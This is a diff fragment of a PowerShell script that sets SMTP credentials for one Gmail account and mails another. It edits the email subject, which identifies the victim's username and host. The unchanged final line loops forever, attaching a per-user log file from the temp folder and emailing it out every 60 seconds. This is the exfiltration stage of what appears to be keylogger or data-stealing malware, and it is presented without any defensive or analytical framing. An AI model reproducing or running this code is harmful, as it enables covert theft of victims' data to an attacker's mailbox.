@@ -5,5 +5,5 @@ $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('01100111.m3rc3h
 $ReportEmail = New-Object System.Net.Mail.MailMessage
 $ReportEmail.From = '01100111.m3rc3h4ck@gmail.com'
 $ReportEmail.To.Add('gabrielg13rojas@gmail.com')
-$ReportEmail.Subject = 'DATOS DE ' +$env:UserName+' EN PC: '+ [System.Net.Dns]::GetHostByName(($env:computerName)).HostName + ' RECIBIDOS'
+$ReportEmail.Subject = 'INFO -> ' +$env:UserName+', PC: '+ [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
 while(1){$ReportEmail.Attachments.Add("$env:temp/$env:UserName.log");$SMTPInfo.Send($ReportEmail);sleep 60} 
